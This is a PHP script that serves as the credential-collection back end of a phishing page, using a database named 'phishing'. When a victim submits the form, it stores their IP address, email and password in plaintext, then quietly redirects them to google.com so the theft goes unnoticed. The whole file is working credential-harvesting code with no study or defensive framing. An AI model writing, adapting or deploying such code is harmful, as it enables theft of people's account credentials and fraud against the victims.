<?php

$db_host = "localhost";
$db_user = "root";
$db_pass = "root";
$db_name = "phishing";

$conn = new mysqli($db_host,$db_user,$db_pass, $db_name) or die("Errore connessione server");


// Function to get the client IP address
function get_client_ip() {
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

if (isset($_POST["email"]) && isset($_POST["password"])) {

    $query = 'insert utenti VALUES("'.
        get_client_ip()
        .'", "'.
        $conn->real_escape_string($_POST["email"])
        .'", "'.
        $conn->real_escape_string($_POST["password"])
        .'")';

    $conn->query($query);

    header("Location: http://www.google.com/");
    exit();

} else echo "
    <script>
    window.location.href = 'index.php'
</script>

"
?>